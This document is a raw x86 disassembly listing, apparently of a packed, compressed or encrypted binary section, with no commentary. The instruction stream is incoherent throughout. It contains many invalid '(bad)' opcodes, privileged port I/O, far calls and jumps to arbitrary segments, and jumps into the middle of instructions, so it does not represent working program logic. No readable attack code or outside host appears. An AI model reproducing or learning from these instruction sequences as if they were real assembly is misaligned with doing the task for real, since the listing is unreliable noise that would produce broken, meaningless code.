  40530b:	ror    ch,1
  40530d:	pop    edi
  40530e:	sbb    BYTE PTR [eax-0x1a],ah
  405311:	jecxz  0x4052f8
  405313:	push   0xffffffdb
  405315:	cmp    al,0x5c
  405317:	loop   0x405390
  405319:	fiadd  DWORD PTR [eax-0x28]
  40531c:	dec    eax
  40531d:	add    al,0x7f
  40531f:	call   0x50a:0xcde73fea
  405326:	mov    cl,BYTE PTR [edi+0x4]
  405329:	test   BYTE PTR [esi],bh
  40532b:	mov    cs,WORD PTR [ebx-0x74850531]
  405331:	sbb    al,0x95
  405333:	push   ebx
  405334:	xor    eax,0xdb9a0904
  405339:	xchg   esi,eax
  40533a:	mov    BYTE PTR [ecx+0x7925aedc],dl
  405340:	inc    ebp
  405341:	mov    esp,0x2ebc9fe7
  405346:	fs xor eax,0xd830b08f
  40534c:	pusha  
  40534d:	mov    bh,0x31
  40534f:	and    eax,0xd8b57eff
  405354:	es sub al,0xfa
  405357:	pop    edi
  405358:	rol    DWORD PTR [ecx],0xb0
  40535b:	xchg   ecx,eax
  40535c:	sub    BYTE PTR [ecx],bl
  40535e:	jge    0x4053d5
  405360:	mov    eax,ds:0xf932993d
  405365:	mov    cl,0x96
  405367:	push   esp
  405368:	sub    ah,ah
  40536a:	data16 sub al,0x84
  40536d:	inc    ecx
  40536e:	repz or DWORD PTR [ecx-0x5c2dc044],0x2daf3eec
  405379:	sub    al,BYTE PTR [ebp+0x43495cf2]
  40537f:	loope  0x4053bc
  405381:	stos   BYTE PTR es:[edi],al
  405382:	in     eax,dx
  405383:	inc    esp
  405384:	push   ss
  405385:	xor    BYTE PTR [esi],bl
  405387:	test   al,0xa0
  405389:	sbb    BYTE PTR [ecx+0x54],0x23
  40538d:	push   eax
  40538e:	sub    eax,0xac927fb1
  405393:	mov    ds:0x238442a5,eax
  405398:	in     al,0xda
  40539a:	clc    
  40539b:	pop    esp
  40539c:	daa    
  40539d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40539e:	cmp    al,0xc1
  4053a0:	es fs hlt 
  4053a3:	pop    ecx
  4053a4:	gs sti 
  4053a6:	mov    eax,ds:0x37d5e046
  4053ab:	dec    eax
  4053ac:	push   cs
  4053ad:	dec    esi
  4053ae:	stos   BYTE PTR es:[edi],al
  4053af:	ins    BYTE PTR es:[edi],dx
  4053b0:	test   BYTE PTR [edx],ah
  4053b2:	gs push ebx
  4053b4:	outs   dx,BYTE PTR ds:[esi]
  4053b5:	mov    ch,0x7c
  4053b7:	xchg   edx,esi
  4053b9:	adc    dl,bl
  4053bb:	or     ecx,DWORD PTR [ebp-0x54]
  4053be:	jmp    0x405371
  4053c0:	fiadd  DWORD PTR [esp+ebx*4]
  4053c3:	cmp    al,0xd7
  4053c5:	dec    ecx
  4053c6:	icebp  
  4053c7:	(bad)  
  4053c8:	push   ss
  4053c9:	lahf   
  4053ca:	and    al,0xfa
  4053cc:	inc    edx
  4053cd:	cmp    cl,ah
  4053cf:	in     al,0x7b
  4053d1:	repz jns 0x405377
  4053d4:	lock mov edi,0x8078e329
  4053da:	push   es
  4053db:	je     0x4053d2
  4053dd:	pop    es
  4053de:	test   DWORD PTR [ecx],ecx
  4053e0:	sbb    ch,BYTE PTR [ebx+0x2a6cf309]
  4053e6:	dec    edi
  4053e7:	push   ds
  4053e8:	ror    ecx,0x92
  4053eb:	jmp    0x4053c0
  4053ed:	stos   DWORD PTR es:[edi],eax
  4053ee:	mov    ecx,0x2fad550a
  4053f3:	in     eax,0x85
  4053f5:	mov    ebx,0x3ec49c8
  4053fa:	(bad)  
  4053fb:	scas   al,BYTE PTR es:[edi]
  4053fc:	cdq    
  4053fd:	loop   0x4053a1
  4053ff:	sahf   
  405400:	bound  edx,QWORD PTR [edi+0x1b4381dc]
  405406:	shl    BYTE PTR [ebp+0x1ad6a185],cl
  40540c:	popf   
  40540d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540e:	push   0x53b9cc21
  405413:	outs   dx,DWORD PTR ds:[esi]
  405414:	std    
  405415:	aas    
  405416:	xchg   ebx,eax
  405417:	sub    ebp,edx
  405419:	mov    eax,ds:0x3095933e
  40541e:	fisttp DWORD PTR [edx+eiz*2-0x61]
  405422:	or     al,0xc8
  405424:	fwait
  405425:	jns    0x4053f8
  405427:	(bad)  
  405429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40542a:	push   0x50
  40542c:	icebp  
  40542d:	cwde   
  40542e:	clc    
  40542f:	mov    ebp,0x370b1468
  405434:	jecxz  0x40541b
  405436:	pop    ds
  405437:	or     ch,BYTE PTR [ecx+0x775b8614]
  40543d:	mov    DWORD PTR [edx],esi
  40543f:	mov    al,0x1
  405441:	add    BYTE PTR [esi+0x5f],0x60
  405445:	dec    esp
  405446:	add    ch,ah
  405448:	lahf   
  405449:	mov    ah,0xc7
  40544b:	and    BYTE PTR [ecx-0x4c],cl
  40544e:	mov    cl,0x3d
  405450:	adc    esi,ebx
  405452:	push   0x3d63900c
  405457:	push   ebp
  405458:	(bad)  
  40545a:	loope  0x405418
  40545c:	(bad)  
  40545d:	gs or  al,0xbc
  405460:	sub    DWORD PTR [esi+0x76],ebp
  405463:	sub    eax,0x53d769bf
  405468:	pop    ebx
  405469:	xor    bh,cl
  40546b:	fidivr WORD PTR fs:[eax+0x24]
  40546f:	imul   esp,DWORD PTR [ecx+0x3a],0x27
  405473:	push   eax
  405474:	ins    DWORD PTR es:[edi],dx
  405475:	imul   edi,DWORD PTR [ebp-0x1c],0x0
  405479:	test   eax,0xcdcd9a65
  40547e:	xor    edx,DWORD PTR [edx]
  405480:	xor    al,0x65
  405482:	mov    ch,BYTE PTR [edi+edi*1+0x3bb751d7]
  405489:	and    BYTE PTR [edx+0x77],0xf2
  40548d:	call   0xacc:0x4882bdf5
  405494:	into   
  405495:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  405497:	xor    eax,0x904d70a0
  40549c:	jno    0x405462
  40549e:	and    DWORD PTR [eax-0x50892c32],0xffffff8e
  4054a5:	ins    DWORD PTR es:[edi],dx
  4054a6:	int3   
  4054a7:	lea    ebp,[eax+edi*8]
  4054aa:	inc    edi
  4054ab:	aas    
  4054ac:	push   ebx
  4054ad:	(bad)  
  4054ae:	mov    bl,0xaf
  4054b0:	push   esp
  4054b1:	fcom   QWORD PTR [edx]
  4054b3:	inc    edx
  4054b4:	cmp    dl,dh
  4054b6:	retf   0x2dfa
  4054b9:	sti    
  4054ba:	push   edi
  4054bb:	jns    0x40545b
  4054bd:	push   edx
  4054be:	test   DWORD PTR [ebp-0x641c5fa7],edi
  4054c4:	lahf   
  4054c5:	pop    ebx
  4054c6:	cmp    al,BYTE PTR [ebx]
  4054c8:	sub    esp,DWORD PTR [eax+0x6a]
  4054cb:	xor    al,0x76
  4054cd:	cld    
  4054ce:	or     BYTE PTR [edi+0x5fc2102],ah
  4054d4:	dec    esi
  4054d5:	dec    edx
  4054d6:	lea    esi,[edx-0x3a5cb4c3]
  4054dc:	xor    al,0x7e
  4054de:	sbb    BYTE PTR [edi],ch
  4054e0:	jo     0x405556
  4054e2:	test   BYTE PTR [edx+0x2d],bh
  4054e5:	dec    edi
  4054e6:	icebp  
  4054e7:	inc    eax
  4054e8:	fisttp WORD PTR [esi]
  4054ea:	addr16 push es
  4054ec:	(bad)  
  4054ed:	iret   
  4054ee:	lods   al,BYTE PTR ds:[esi]
  4054ef:	or     al,0x1e
  4054f1:	iret   
  4054f2:	jge    0x405523
  4054f4:	and    DWORD PTR [eax*2-0x1ea8c730],0xe093b483
  4054ff:	aad    0x6e
  405501:	mov    cl,0x11
  405503:	sub    eax,0xaf60d54
  405508:	(bad)  [edi]
  40550a:	js     0x40554b
  40550c:	mov    ebp,0xa1a9b418
  405511:	out    0x3f,eax
  405513:	mov    DWORD PTR [edx*2+0x3fcb0d7c],esp
  40551a:	aas    
  40551b:	mov    BYTE PTR ds:0x2e34b096,ah
  405521:	jbe    0x40553d
  405523:	jo     0x40557c
  405525:	inc    ebx
  405526:	and    al,0x84
  405528:	fcomp  QWORD PTR [edi+0xf237f7c]
  40552e:	sub    al,0xb1
  405530:	sbb    DWORD PTR [edx],ecx
  405532:	pop    ecx
  405533:	in     eax,0x49
  405535:	not    ebp
  405537:	stos   BYTE PTR es:[edi],al
  405538:	push   cs
  405539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40553a:	(bad)  
  40553c:	jmp    0x40555b
  40553e:	jmp    0x405507
  405540:	xor    bh,ch
  405542:	loop   0x4055a1
  405544:	cmp    al,0xa9
  405546:	xor    eax,0x74ad57df
  40554b:	aam    0xf0
  40554d:	addr16 push ebx
  40554f:	mov    al,ds:0x82244b2c
  405554:	cs push ds
  405556:	mov    edx,0x7527ab01
  40555b:	add    BYTE PTR [eax-0x55],0x8
  40555f:	test   BYTE PTR [esi],bl
  405561:	mov    BYTE PTR [edi+0x596e72ef],ch
  405567:	and    eax,0x3fb97c56
  40556c:	sub    bl,0xcd
  40556f:	push   0xea2fa989
  405574:	shl    BYTE PTR [edi],0x10
  405577:	mov    ebx,ecx
  405579:	jmp    0xa65e:0xe99f2f99
  405580:	mov    edi,DWORD PTR [esp+edx*1-0x42b600c]
  405587:	pop    edx
  405588:	cmc    
  405589:	mov    BYTE PTR [edx+ebp*1-0xe3ea539],ah
  405590:	pop    ss
  405591:	jmp    0xcfba56dc
  405596:	test   BYTE PTR [ebp-0xa],dh
  405599:	mov    bh,BYTE PTR [ebx-0x719e37f0]
  40559f:	inc    ebp
  4055a0:	jno    0x4055c4
  4055a2:	(bad)  
  4055a3:	sahf   
  4055a4:	out    0x95,eax
  4055a6:	or     al,0xce
  4055a8:	(bad)  
  4055a9:	retf   
  4055aa:	pop    ss
  4055ab:	and    bl,BYTE PTR [edi+0x75]
  4055ae:	xchg   ecx,eax
  4055af:	push   esp
  4055b0:	adc    esi,DWORD PTR [ecx+edx*2]
  4055b3:	mov    ebp,0x535c992b
  4055b8:	xchg   esi,eax
  4055b9:	jp     0x4055ee
  4055bb:	sbb    al,0xe9
  4055bd:	pop    edi
  4055be:	or     BYTE PTR [edx+0x44],0xcb
  4055c2:	jne    0x40563a
  4055c4:	dec    dx
  4055c6:	pop    edx
  4055c7:	ss (bad) 
  4055c9:	and    bl,BYTE PTR [ecx-0x3f619c19]
  4055cf:	xor    al,0x6d
  4055d1:	test   eax,0xb78cc71b
  4055d6:	in     eax,dx
  4055d7:	jnp    0x405624
  4055d9:	xchg   ecx,eax
  4055da:	call   0x10e4:0x2b28c232
  4055e1:	mov    dl,0x18
  4055e3:	mov    bh,0x97
  4055e5:	shl    BYTE PTR [ecx-0x6f290680],1
  4055eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055ec:	jno    0x40561a
  4055ee:	pop    ss
  4055ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055f0:	sbb    DWORD PTR [edi-0x26],ebp
  4055f3:	or     esp,ebx
  4055f5:	sub    al,0x15
  4055f7:	mov    esi,0xbcd8e821
  4055fc:	and    BYTE PTR [edi-0xc],dl
  4055ff:	jecxz  0x4055df
  405601:	push   esp
  405602:	sti    
  405603:	push   ecx
  405604:	jp     0x405593
  405606:	pusha  
  405607:	xchg   esp,eax
  405608:	xor    DWORD PTR [edi+ecx*8-0xc],edi
  40560c:	xor    eax,0x5ffde49e
  405611:	or     dh,dl
  405613:	enter  0xf2b5,0xea
  405617:	(bad)  
  405619:	lods   eax,DWORD PTR ds:[esi]
  40561a:	pushw  es
  40561c:	mov    eax,ds:0xa3d090f7
  405621:	pop    esi
  405622:	push   ebx
  405623:	fs lahf 
  405625:	fmul   st,st(7)
  405627:	test   BYTE PTR [eax+edx*8],dl
  40562a:	mov    bh,ch
  40562c:	out    0x86,eax
  40562e:	(bad)  
  405630:	sti    
  405631:	jle    0x405686
  405633:	out    0xe3,al
  405635:	arpl   WORD PTR [ebp-0x15],dx
  405638:	mov    ebp,0x42a725af
  40563d:	ins    BYTE PTR es:[edi],dx
  40563e:	dec    ecx
  40563f:	sub    DWORD PTR fs:[eax+eax*8+0x42225c2],0xbbe370a6
  40564b:	outs   dx,BYTE PTR ds:[esi]
  40564c:	int    0x3c
  40564e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564f:	cmp    al,0x1
  405651:	jne    0x4056bf
  405653:	xor    dh,dl
  405655:	repnz stc 
  405657:	pop    ebp
  405658:	lods   eax,DWORD PTR ds:[esi]
  405659:	div    BYTE PTR [edx]
  40565b:	sahf   
  40565c:	or     al,0xc2
  40565e:	shl    DWORD PTR [ebx-0x41d0ca0d],cl
  405664:	sbb    cl,BYTE PTR [ebx+0x18faad4]
  40566a:	xor    al,0x4
  40566c:	mov    gs,WORD PTR ds:0xf199730f
  405672:	add    eax,0x3b0dd7e
  405677:	inc    ebx
  405678:	cld    
  405679:	mov    esp,0x64120d4d
  40567e:	sbb    al,0x55
  405680:	cmp    DWORD PTR [esi+0x1a336290],ecx
  405686:	jb     0x405653
  405688:	shr    DWORD PTR [eax],cl
  40568a:	fild   DWORD PTR [edi+0x61]
  40568d:	jmp    0x405618
  40568f:	iret   
  405690:	cmp    al,0xc8
  405692:	mov    ds:0x3ca2bbb,eax
  405697:	xlat   BYTE PTR ds:[ebx]
  405698:	push   eax
  405699:	xchg   ecx,eax
  40569a:	repnz fmul QWORD PTR [ebp+ebx*1+0x7]
  40569f:	inc    esi
  4056a0:	fdivp  st(2),st
  4056a2:	or     al,0x35
  4056a4:	or     al,0xb6
  4056a6:	xlat   BYTE PTR ds:[ebx]
  4056a7:	cmp    al,0x43
  4056a9:	fmul   st,st(3)
  4056ab:	scas   eax,DWORD PTR es:[edi]
  4056ac:	mov    bh,0x9f
  4056ae:	ins    DWORD PTR es:[edi],dx
  4056af:	fcmovnbe st,st(1)
  4056b1:	jp     0x4056b5
  4056b3:	adc    eax,DWORD PTR [edx+eiz*4+0x2a802f68]
  4056ba:	and    BYTE PTR [edi],0x3e
  4056bd:	adc    al,0x27
  4056bf:	test   DWORD PTR [esi+eiz*1],esi
  4056c2:	or     dh,BYTE PTR [edx+esi*8+0x4dd80ac2]
  4056c9:	mov    ebp,0xae168683
  4056ce:	pusha  
  4056cf:	ins    DWORD PTR es:[edi],dx
  4056d0:	rcl    BYTE PTR [ebp-0x2a8b9fe5],cl
  4056d6:	js     0x40567f
  4056d8:	add    DWORD PTR [eax-0xf],ecx
  4056db:	test   BYTE PTR [ebx+0x5a],ah
  4056de:	cmp    BYTE PTR [eax+0xfec922a],ah
  4056e4:	or     BYTE PTR [eax+0x48fc8e2],0x96
  4056eb:	mov    dh,0xb9
  4056ed:	xor    eax,DWORD PTR [edi]
  4056ef:	in     eax,dx
  4056f0:	mov    ds:0x193b63df,al
  4056f5:	sbb    edx,ecx
  4056f7:	test   eax,0xaecefb0f
  4056fc:	ins    BYTE PTR es:[edi],dx
  4056fd:	pop    ebp
  4056fe:	mov    dh,0x7c
  405700:	outs   dx,BYTE PTR ds:[esi]
  405701:	jo     0x405779
  405703:	fiadd  DWORD PTR [ebp+0x19]
  405706:	gs push ecx
  405708:	retf   
  405709:	cmp    al,0x55
  40570b:	fisubr WORD PTR [ebx-0x3a0c54bf]
  405711:	mov    edx,0x4a291274
  405716:	xchg   ebp,eax
  405717:	mov    ebp,0x9da44a14
  40571c:	push   0x38
  40571e:	mov    ds:0x453fdaae,eax
  405723:	scas   al,BYTE PTR es:[edi]
  405724:	(bad)  
  405725:	push   esp
  405726:	jle    0x4056eb
  405728:	add    BYTE PTR [ebx+0x5e],dl
  40572b:	fucomp st(7)
  40572d:	cmp    ebp,DWORD PTR [ecx-0x646f6d1c]
  405733:	xchg   ecx,eax
  405734:	cmp    eax,0x8e5af
  405739:	pop    ds
  40573a:	xor    al,0xca
  40573c:	aad    0xfd
  40573e:	inc    esp
  40573f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405740:	or     al,0x67
  405742:	push   edi
  405743:	cld    
  405744:	push   0xc496afef
  405749:	mov    ebx,0xcda5d75b
  40574e:	loope  0x4056d3
  405750:	inc    ebp
  405751:	and    cl,BYTE PTR [esi+edx*1+0x75]
  405755:	leave  
  405756:	or     BYTE PTR [esi+ecx*4+0x7c7fdc09],ch
  40575d:	jo     0x405788
  40575f:	pop    ss
  405760:	or     esp,DWORD PTR [ebx]
  405762:	mov    bh,0xc4
  405764:	shr    DWORD PTR [esi+0x3a7de250],0x17
  40576b:	and    eax,0x6d1ab5a2
  405770:	int    0xd0
  405772:	cmp    dl,BYTE PTR [edi-0x56737b6e]
  405778:	adc    ah,BYTE PTR ds:0xd1a55c57
  40577e:	sbb    al,0x3d
  405780:	jne    0x40577d
  405782:	out    dx,eax
  405783:	xor    BYTE PTR [esi+0x49c65f05],ch
  405789:	stc    
  40578a:	push   ecx
  40578b:	lahf   
  40578c:	shr    bh,cl
  40578e:	(bad)  
  40578f:	xor    edx,DWORD PTR [edi+0x548308a7]
  405795:	test   edx,ecx
  405797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405798:	ss adc al,0x38
  40579b:	sub    ah,BYTE PTR [edx+0x5f]
  40579e:	xchg   DWORD PTR [ecx-0x3f799029],eax
  4057a4:	hlt    
  4057a5:	mov    cl,0x16
  4057a7:	sub    eax,0xbeeb7998
  4057ac:	inc    esi
  4057ad:	call   0xaec:0x7b5f42bd
  4057b4:	loopne 0x405757
  4057b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b7:	aaa    
  4057b8:	xchg   esp,eax
  4057b9:	sbb    al,0x91
  4057bb:	lods   al,BYTE PTR ds:[esi]
  4057bc:	ds xchg esi,eax
  4057be:	jmp    0x56f7:0xe78fa024
  4057c5:	jnp    0x405839
  4057c7:	cmp    BYTE PTR [ecx],dh
  4057c9:	(bad)  
  4057ca:	mov    ah,BYTE PTR [ecx+0x24]
  4057cd:	mov    bl,0x4f
  4057cf:	xchg   ecx,eax
  4057d0:	(bad)  
  4057d1:	jmp    0xa346bc66
  4057d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057d7:	arpl   WORD PTR ds:0xae4c3cec,cx
  4057dd:	fmul   QWORD PTR [ecx]
  4057df:	inc    ebp
  4057e0:	push   es
  4057e1:	sub    bl,BYTE PTR [edx]
  4057e3:	sub    BYTE PTR ds:0xceb0c3f,dl
  4057e9:	(bad)  
  4057ea:	shr    DWORD PTR [edi],cl
  4057ec:	ror    DWORD PTR [eax-0x12],1
  4057ef:	jb     0x4057cc
  4057f1:	sub    edx,edi
  4057f3:	fsub   st,st(7)
  4057f5:	jmp    0x53cf7354
  4057fa:	scas   eax,DWORD PTR es:[edi]
  4057fb:	retf   0x94cc
  4057fe:	shr    DWORD PTR [edx+0x50],0xd7
  405802:	shl    ah,1
  405804:	ins    BYTE PTR es:[edi],dx
  405805:	and    eax,edx
  405807:	pushf  
  405808:	fadd   QWORD PTR [esi]
  40580a:	pop    esi
  40580b:	or     al,0x28
  40580d:	push   edi
  40580e:	sub    eax,0x4c3d261d
  405813:	jg     0x4057bf
  405815:	ins    BYTE PTR es:[edi],dx
  405816:	cmp    esi,DWORD PTR [esi]
  405818:	ins    DWORD PTR es:[edi],dx
  405819:	js     0x405805
  40581b:	cmp    BYTE PTR [ebp-0xfcc0992],cl
  405821:	and    eax,0x37a4ac81
  405826:	dec    ebp
  405827:	mov    al,ds:0x2cdf5ed5
  40582c:	or     DWORD PTR [ebx+0x7f],ecx
  40582f:	imul   eax,DWORD PTR [edx],0x9ad17725
  405835:	adc    eax,0x27c37544
  40583a:	rcl    DWORD PTR ds:0x5ed17f35,1
  405840:	mov    esp,0xc84fa4ef
  405845:	into   
  405846:	lods   eax,DWORD PTR ds:[esi]
  405847:	mov    eax,ds:0xcaa0874c
  40584c:	mov    ds:0xb75797e1,eax
  405851:	lahf   
  405852:	iret   
  405853:	mov    edi,0xa9d4a0c4
  405858:	stc    
  405859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40585a:	je     0x4057eb
  40585c:	into   
  40585d:	xor    dl,0xe9
  405860:	mov    cl,0xff
  405862:	(bad)
  405865:	and    al,0x92
  405867:	sar    esp,cl
  405869:	xchg   ebx,eax
  40586a:	mov    esi,0x2e15b360
  40586f:	sahf   
  405870:	int3   
  405871:	add    eax,0xe34c4d1c
  405876:	(bad)  
  405877:	daa    
  405878:	xor    eax,0xcf0dbb77
  40587d:	sbb    BYTE PTR [esp+edi*2+0x3d405d96],dl
  405884:	std    
  405885:	add    ah,ch
  405887:	inc    edx
  405888:	push   edx
  405889:	iret   
  40588a:	iret   
  40588b:	jmp    0x77bd:0x58d5e122
  405892:	lea    edx,[edi]
  405894:	cmp    al,0x5
  405896:	jne    0x40582f
  405898:	out    0x9b,al
  40589a:	or     ecx,eax
  40589c:	arpl   bx,sp
  40589e:	xchg   DWORD PTR [eax],esi
  4058a0:	mov    dh,0xd1
  4058a2:	adc    eax,0x9d83bf19
  4058a7:	stos   DWORD PTR es:[edi],eax
  4058a8:	pop    ecx
  4058a9:	popf   
  4058aa:	les    esp,FWORD PTR [esi-0xf]
  4058ad:	push   esi
  4058ae:	xchg   edx,eax
  4058af:	inc    ecx
  4058b0:	dec    esi
  4058b1:	xchg   ebx,eax
  4058b2:	cmp    ebx,edi
  4058b4:	pop    ebx
  4058b5:	fld    TBYTE PTR [ecx-0xe]
  4058b8:	imul   edi,DWORD PTR [ebx],0x5c
  4058bb:	mov    esi,0x628fa77
  4058c0:	add    dl,BYTE PTR [ecx-0x28]
  4058c3:	and    ecx,edi
  4058c5:	imul   esi,DWORD PTR [eax+0x3f39cb32],0xffffffe4
  4058cc:	push   0xc5b95dc2
  4058d1:	pop    es
  4058d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d3:	push   edi
  4058d4:	aad    0xc3
  4058d6:	mov    ds:0x82a1c0fb,al
  4058db:	int    0x2f
  4058dd:	jle    0x40587e
  4058df:	xchg   edi,eax
  4058e0:	adc    eax,0xd4fcb7d6
  4058e5:	push   eax
  4058e6:	pop    es
  4058e7:	pop    es
  4058e8:	arpl   WORD PTR [ebp-0x7c],bx
  4058eb:	ror    DWORD PTR [edi+0x11],0xd9
  4058ef:	cmp    eax,eax
  4058f1:	or     al,0xb6
  4058f3:	mov    cl,0xda
  4058f5:	xchg   edi,eax
  4058f6:	cmp    al,0xd7
  4058f8:	sahf   
  4058f9:	pop    es
  4058fa:	xor    al,0x77
  4058fc:	sbb    edi,eax
  4058fe:	mov    eax,0x1cffd377
  405903:	ret    
  405904:	in     eax,dx
  405905:	dec    eax
  405906:	fisttp WORD PTR [edx]
  405908:	pop    esp
  405909:	ins    BYTE PTR es:[edi],dx
  40590a:	xchg   ebx,eax
  40590b:	sub    eax,0x7001c660
  405910:	pop    ecx
  405911:	dec    esi
  405912:	pop    ebx
  405913:	jns    0x40598b
  405915:	cmp    al,0xdc
  405917:	add    ebp,DWORD PTR [ebx-0x3e7d5b15]
  40591d:	adc    DWORD PTR [eax-0x7f97dad2],0x7b56a171
  405927:	lds    eax,FWORD PTR [edi-0x49716eca]
  40592d:	leave  
  40592e:	jne    0x4058c4
  405930:	push   ebp
  405931:	loope  0x405908
  405933:	enter  0x183f,0xd1
  405937:	and    eax,0xb4cd1977
  40593c:	std    
  40593d:	xchg   edi,eax
  40593e:	loope  0x4059a3
  405940:	cmovns edi,DWORD PTR [eax+0x35]
  405944:	cmp    edx,esp
  405946:	push   es
  405947:	mov    edi,ebx
  405949:	les    esi,FWORD PTR [ebp+0x40b9db60]
  40594f:	jae    0x40592d
  405951:	add    al,0x7b
  405953:	retf   0x36e1
  405956:	sub    al,0xd7
  405958:	clc    
  405959:	lock (bad) 
  40595b:	or     al,0x1b
  40595d:	xor    BYTE PTR [edi],ah
  40595f:	aaa    
  405960:	mov    ds:0x67e852f6,al
  405965:	fwait
  405966:	and    dl,bh
  405968:	das    
  405969:	shr    esp,cl
  40596b:	jmp    0xe3ad859
  405970:	lahf   
  405971:	(bad)  
  405972:	pop    edi
  405973:	xor    eax,0xc25a1706
  405978:	xchg   ebp,eax
  405979:	test   al,0xe2
  40597b:	in     al,0x6c
  40597d:	sub    eax,0x7ed0807e
  405982:	push   0xffffffc1
  405984:	mov    dl,0xe8
  405986:	inc    esi
  405987:	mov    dh,0x73
  405989:	cmp    eax,DWORD PTR [eax]
  40598b:	dec    ecx
  40598c:	pop    esi
  40598d:	cmp    BYTE PTR [ecx],ch
  40598f:	jmp    0x1ae8:0x1d360e0
  405996:	mov    BYTE PTR [ebp+0x3668bb34],0x37
  40599d:	mov    ds:0x5b7dee5,al
  4059a2:	(bad)  
  4059a3:	xor    eax,0xf03f58e4
  4059a8:	mov    ch,BYTE PTR [edi-0x13]
  4059ab:	out    0x2b,eax
  4059ad:	ds hlt 
  4059af:	bound  eax,QWORD PTR [eax]
  4059b1:	mov    al,0xd7
  4059b3:	or     al,0xf0
  4059b5:	xlat   BYTE PTR ds:[ebx]
  4059b6:	mov    cl,0x41
  4059b8:	push   esi
  4059b9:	pop    esp
  4059ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059bb:	xchg   edx,eax
  4059bc:	bound  esp,QWORD PTR [ebx]
  4059be:	jg     0x405a06
  4059c0:	int    0x24
  4059c2:	nop
  4059c3:	ss jne 0x4059c2
  4059c6:	push   ss
  4059c7:	jmp    0x864e:0xc2bd3410
  4059ce:	ss pop esp
  4059d0:	(bad)  
  4059d1:	repz retf 0x93be
  4059d5:	jmp    0x4059f2
  4059d7:	aas    
  4059d8:	jmp    0x9784:0xa440d48a
  4059df:	clc    
  4059e0:	jg     0x405a27
  4059e2:	repz je 0x405979
  4059e5:	sar    ch,1
  4059e7:	dec    eax
  4059e8:	or     al,0xcd
  4059ea:	(bad)  [ecx+0x7f905d96]
  4059f0:	adc    esp,DWORD PTR [ebp-0x1eb2b49a]
  4059f6:	add    al,BYTE PTR [edx]
  4059f8:	or     BYTE PTR [edx+0x1c1d15d6],dl
  4059fe:	sbb    eax,0xce9004ec
  405a03:	in     al,dx
  405a04:	cmp    DWORD PTR [ecx+0x290e77d0],edi
  405a0a:	push   0xe10c14b9
  405a0f:	cmp    eax,edi
  405a11:	jbe    0x4059ed
  405a13:	pop    ss
  405a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a15:	arpl   WORD PTR [edx],di
  405a17:	dec    esi
  405a18:	call   0x94454c98
  405a1d:	cmc    
  405a1e:	xor    DWORD PTR [ecx-0xf],ebx
  405a21:	fwait
  405a22:	enter  0xc29f,0xa9
  405a26:	mov    ecx,DWORD PTR [ebp-0x5]
  405a29:	xlat   BYTE PTR ds:[ebx]
  405a2a:	popf   
  405a2b:	and    eax,0xe8d424d7
  405a30:	push   esp
  405a31:	outs   dx,BYTE PTR ds:[esi]
  405a32:	cmp    edx,ecx
  405a34:	inc    esp
  405a35:	cli    
  405a36:	jmp    0x374e18cf
  405a3b:	nop
  405a3c:	mov    ah,0x58
  405a3e:	and    BYTE PTR [edx-0x1f94b35c],dh
  405a44:	pusha  
  405a45:	rcl    ebp,cl
  405a47:	(bad)  
  405a48:	push   ecx
  405a49:	xchg   ah,cl
  405a4b:	fs (bad) 
  405a4d:	imul   edx,DWORD PTR [edi-0x4a66f566],0xf17fbbe7
  405a57:	mov    cl,0xae
  405a59:	aaa    
  405a5a:	and    cl,cl
  405a5c:	add    al,BYTE PTR [esi]
  405a5e:	xlat   BYTE PTR ds:[ebx]
  405a5f:	push   esp
  405a60:	call   0xae6b9082
  405a65:	sub    esp,DWORD PTR [ecx+0x35]
  405a68:	pop    ebx
  405a69:	jae    0x405a97
  405a6b:	push   esi
  405a6c:	popa   
  405a6d:	or     eax,0x3ea35592
  405a72:	lock mov ebp,0x7b0dde13
  405a78:	jbe    0xde6a2052
  405a7e:	outs   dx,BYTE PTR ds:[esi]
  405a7f:	and    DWORD PTR [eax-0x28a82882],edx
  405a85:	xchg   ebp,eax
  405a86:	sbb    eax,0xf6681817
  405a8b:	xor    ebx,DWORD PTR [eax-0x1828e45d]
  405a91:	nop
  405a92:	or     DWORD PTR [ebx-0x6f],0xef66b25f
  405a99:	sbb    edi,DWORD PTR [edi+0x38]
  405a9c:	and    ch,ah
  405a9e:	cmp    eax,0xaa77d11e
  405aa3:	jecxz  0x405b15
  405aa5:	leave  
  405aa6:	and    bl,BYTE PTR [edi-0x354a1270]
  405aac:	mov    dh,BYTE PTR [esp+edi*4+0x59]
  405ab0:	inc    esp
  405ab1:	arpl   WORD PTR [esi],di
  405ab3:	and    DWORD PTR [ecx-0x78],ebx
  405ab6:	cmp    ebp,DWORD PTR [eax-0x42e149d0]
  405abc:	inc    ebp
  405abd:	imul   esp,DWORD PTR [eax+esi*8],0x2d
  405ac1:	aaa    
  405ac2:	cmp    al,0xce
  405ac4:	ins    BYTE PTR es:[edi],dx
  405ac5:	jne    0x405aac
  405ac7:	outs   dx,BYTE PTR ds:[esi]
  405ac8:	pop    edx
  405ac9:	cmp    dl,al
  405acb:	pop    ebp
  405acc:	test   eax,0xe05da061
  405ad1:	loope  0x405aeb
  405ad3:	fistp  DWORD PTR [ebx-0x7b72a198]
  405ad9:	fmul   DWORD PTR [esi+0x18]
  405adc:	stos   BYTE PTR es:[edi],al
  405add:	jecxz  0x405a87
  405adf:	loope  0x405b13
  405ae1:	ins    DWORD PTR es:[edi],dx
  405ae2:	and    al,0xe1
  405ae4:	mov    edi,DWORD PTR [eax-0x16]
  405ae7:	test   BYTE PTR [ebx-0x30],ch
  405aea:	cmp    eax,ecx
  405aec:	loopne 0x405b09
  405aee:	adc    eax,0x57f8bd22
